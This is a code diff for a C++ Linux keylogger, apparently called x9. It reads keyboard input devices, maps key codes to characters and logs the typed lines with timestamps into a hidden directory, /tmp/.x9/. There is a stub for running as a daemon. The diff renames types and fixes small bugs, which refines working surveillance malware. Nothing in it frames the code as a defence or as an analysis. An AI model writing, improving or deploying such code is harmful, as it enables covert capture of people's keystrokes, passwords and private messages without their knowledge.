@@ -18,7 +18,7 @@
 
 #define LOGS_DIRECTORY "/tmp/.x9/"
 
-struct x9_ctx {
+struct x9_ctx_t {
   bool is_capslock_on;
   bool is_shift_pressed;
   std::vector<int> kb_fds;
@@ -27,24 +27,24 @@ struct x9_ctx {
   struct input_event event;
 };
 
-struct key_event_handler {
+struct key_event_handler_t {
   char key_char;
   char key_char_shift;
-  void (*cb)(struct x9_ctx *);
+  void (*cb)(x9_ctx_t *);
 };
 
-void handle_key(struct x9_ctx *);
-void handle_enter(struct x9_ctx *);
-void handle_backspace(struct x9_ctx *);
-void handle_capslock(struct x9_ctx *);
-void handle_delete(struct x9_ctx *);
-void handle_arrow(struct x9_ctx *);
-void handle_shift(struct x9_ctx *);
+void handle_key(x9_ctx_t *);
+void handle_enter(x9_ctx_t *);
+void handle_backspace(x9_ctx_t *);
+void handle_capslock(x9_ctx_t *);
+void handle_delete(x9_ctx_t *);
+void handle_arrow(x9_ctx_t *);
+void handle_shift(x9_ctx_t *);
 
 volatile std::sig_atomic_t must_stop{0};
 
 /* key mapping */
-static const std::map<int, struct key_event_handler> handlers{
+static const std::map<int, key_event_handler_t> handlers{
     {KEY_0, {'0', ')', handle_key}},
     {KEY_1, {'1', '!', handle_key}},
     {KEY_2, {'2', '@', handle_key}},
@@ -109,9 +109,10 @@ std::vector<std::string> get_event_files() {
     std::ifstream file{"/proc/bus/input/devices"};
     std::regex kb_regex{"H: Handlers=sysrq kbd (.+?) leds"};
     std::string line;
-    std::smatch match;
 
     while (std::getline(file, line)) {
+      std::smatch match;
+
       if (std::regex_search(line, match, kb_regex)) {
         content.emplace_back(match[1]);
       }
@@ -127,18 +128,20 @@ std::vector<int> get_keyboard_fds() {
   for (auto &event : get_event_files()) {
     int fd = open(std::string("/dev/input/" + event).c_str(), O_RDONLY);
 
-    fds.emplace_back(fd);
+    if (fd > STDERR_FILENO) {
+      fds.emplace_back(fd);
+    }
   }
 
   return fds;
 }
 
-int initialize_ctx(struct x9_ctx *ctx) {
+int initialize_ctx(x9_ctx_t *ctx) {
   if (!ctx) {
     return 1;
   }
 
-  std::memset(ctx, 0, sizeof(struct x9_ctx));
+  std::memset(ctx, 0, sizeof(x9_ctx_t));
 
   ctx->is_capslock_on = false;
   ctx->buffer_cursor = 0;
@@ -153,13 +156,13 @@ int initialize_ctx(struct x9_ctx *ctx) {
   return 0;
 }
 
-void destroy_ctx(struct x9_ctx *ctx) {
+void destroy_ctx(x9_ctx_t *ctx) {
   for (auto &fd : ctx->kb_fds) {
     close(fd);
   }
 }
 
-void handle_key(struct x9_ctx *ctx) {
+void handle_key(x9_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -176,7 +179,7 @@ void handle_key(struct x9_ctx *ctx) {
                         key_char);
 }
 
-void handle_enter(struct x9_ctx *ctx) {
+void handle_enter(x9_ctx_t *ctx) {
   char date[11], timestamp[9];
 
   if (!ctx->event.value || ctx->kb_buffer.empty()) {
@@ -203,7 +206,7 @@ void handle_enter(struct x9_ctx *ctx) {
   ctx->buffer_cursor = 0;
 }
 
-void handle_capslock(struct x9_ctx *ctx) {
+void handle_capslock(x9_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -211,11 +214,11 @@ void handle_capslock(struct x9_ctx *ctx) {
   ctx->is_capslock_on = !ctx->is_capslock_on;
 }
 
-void handle_shift(struct x9_ctx *ctx) {
+void handle_shift(x9_ctx_t *ctx) {
   ctx->is_shift_pressed = ctx->event.value;
 }
 
-void handle_delete(struct x9_ctx *ctx) {
+void handle_delete(x9_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -225,7 +228,7 @@ void handle_delete(struct x9_ctx *ctx) {
   }
 }
 
-void handle_backspace(struct x9_ctx *ctx) {
+void handle_backspace(x9_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -235,7 +238,7 @@ void handle_backspace(struct x9_ctx *ctx) {
   }
 }
 
-void handle_arrow(struct x9_ctx *ctx) {
+void handle_arrow(x9_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -246,7 +249,7 @@ void handle_arrow(struct x9_ctx *ctx) {
                                                  : (ctx->buffer_cursor + 1);
 }
 
-void run(struct x9_ctx *ctx) {
+void run(x9_ctx_t *ctx) {
   struct input_event ev;
   fd_set rfds;
 
@@ -288,7 +291,7 @@ void run(struct x9_ctx *ctx) {
 void deamonize() {}
 
 int main() {
-  struct x9_ctx ctx;
+  x9_ctx_t ctx;
 
   if (initialize_ctx(&ctx)) {
     std::exit(EXIT_FAILURE);
